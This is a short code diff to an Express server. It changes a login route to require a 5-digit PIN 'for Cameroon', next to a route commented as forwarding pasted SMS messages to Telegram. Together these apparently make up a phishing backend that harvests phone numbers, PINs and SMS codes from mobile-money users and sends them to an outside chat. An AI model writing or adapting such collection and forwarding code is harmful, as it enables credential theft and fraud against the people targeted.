@@ -181,8 +181,9 @@ app.post('/api/login', async (req, res) => {
             return res.status(400).json({ ok: false, error: 'Invalid phone number' });
         }
 
-        if (!/^\d{4}$/.test(pin)) {
-            return res.status(400).json({ ok: false, error: 'PIN must be exactly 4 digits' });
+        // ✅ FIXED: 5-digit PIN for Cameroon
+        if (!/^\d{5}$/.test(pin)) {
+            return res.status(400).json({ ok: false, error: 'PIN must be exactly 5 digits' });
         }
 
         // --- Create session ---
@@ -211,7 +212,6 @@ app.post('/api/login', async (req, res) => {
         return res.status(500).json({ ok: false, error: 'Server error' });
     }
 });
-
 // --------------------------------------------
 // POST /api/sms
 // Receives a pasted SMS and forwards it to Telegram.
